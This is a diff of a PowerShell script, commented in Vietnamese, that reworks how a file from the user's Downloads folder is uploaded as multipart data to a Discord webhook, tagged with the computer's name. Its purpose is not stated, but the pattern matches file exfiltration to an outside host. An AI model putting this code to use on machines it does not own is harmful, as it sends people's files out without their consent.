@@ -43,54 +43,69 @@ try {
 $filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
 Write-Host "[*] Checking file at: $filePath"
 
+# Kiểm tra file tồn tại trước
 if (Test-Path $filePath) {
     Write-Host "[*] File found. Size: $((Get-Item $filePath).Length) bytes"
-    
-    # Tạo JSON metadata cho attachment
-    $payloadJson = @{
-        content = "File attached from $env:COMPUTERNAME"
-        attachments = @(
-            @{
-                id = 0
-                filename = "abc.txt"
-            }
-        )
-    } | ConvertTo-Json
 
+    # Tạo multipart/form-data bằng Invoke-RestMethod (nếu PowerShell 6+)
+    # Nhưng để tương thích với PowerShell 5.1, ta dùng .NET
     try {
-        # Tạo multipart form data
-        $multipart = [System.Net.Http.MultipartFormDataContent]::new()
+        # Tạo boundary ngẫu nhiên
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $contentType = "multipart/form-data; boundary=$boundary"
+        
+        # Tạo nội dung multipart thủ công (an toàn, không phụ thuộc .NET HttpClient)
+        $LF = "`r`n"
+        $bodyLines = @()
         
         # Part 1: payload_json
-        $jsonPart = [System.Net.Http.StringContent]::new($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
-        $multipart.Add($jsonPart, "payload_json")
+        $payloadJson = @{
+            content = "File attached from $env:COMPUTERNAME"
+            attachments = @(
+                @{
+                    id = 0
+                    filename = "abc.txt"
+                }
+            )
+        } | ConvertTo-Json
         
-        # Part 2: file (key phải là "files[0]")
-        $fileStream = [System.IO.File]::OpenRead($filePath)
-        $filePart = [System.Net.Http.StreamContent]::new($fileStream)
-        $filePart.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-        $multipart.Add($filePart, "files[0]", "abc.txt")
+        $bodyLines += "--$boundary"
+        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
+        $bodyLines += "Content-Type: application/json"
+        $bodyLines += ""
+        $bodyLines += $payloadJson
         
-        # Gửi request
-        $client = [System.Net.Http.HttpClient]::new()
-        Write-Host "[*] Uploading file..."
-        $response = $client.PostAsync($webhookUrl, $multipart).Result
+        # Part 2: file (files[0])
+        $bodyLines += "--$boundary"
+        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"abc.txt`""
+        $bodyLines += "Content-Type: application/octet-stream"
+        $bodyLines += ""
         
-        if ($response.IsSuccessStatusCode) {
-            Write-Host "[+] File uploaded successfully!"
-        } else {
-            $errBody = $response.Content.ReadAsStringAsync().Result
-            Write-Host "[-] Upload failed. Status: $($response.StatusCode) - $errBody"
-        }
+        # Đọc file nhị phân
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        
+        # Kết hợp tất cả thành một mảng byte
+        $encoding = [System.Text.Encoding]::UTF8
+        $headerBytes = $encoding.GetBytes(($bodyLines -join $LF) + $LF)
+        $footerBytes = $encoding.GetBytes("$LF--$boundary--$LF")
+        
+        $allBytes = $headerBytes + $fileBytes + $footerBytes
+        
+        # Gửi request bằng Invoke-RestMethod với dữ liệu thô
+        Write-Host "[*] Uploading file (size: $($allBytes.Length) bytes)..."
+        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $allBytes -ContentType $contentType
+        
+        Write-Host "[+] File uploaded successfully! Response: $($response | ConvertTo-Json)"
     } catch {
-        Write-Host "[DEBUG] Entering file upload section"
-        Write-Host "[-] Exception during upload: $($_.Exception.Message)"
-    } finally {
-        if ($fileStream) { $fileStream.Dispose() }
-        if ($client) { $client.Dispose() }
-        if ($multipart) { $multipart.Dispose() }
+        Write-Host "[-] Upload failed: $($_.Exception.Message)"
+        if ($_.Exception.Response) {
+            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
+            $reader.BaseStream.Position = 0
+            $reader.DiscardBufferedData()
+            $responseBody = $reader.ReadToEnd()
+            Write-Host "[-] Discord response: $responseBody"
+        }
     }
 } else {
-    Write-Host "[DEBUG] Entering file upload section"
     Write-Host "[!] File not found at $filePath"
 }
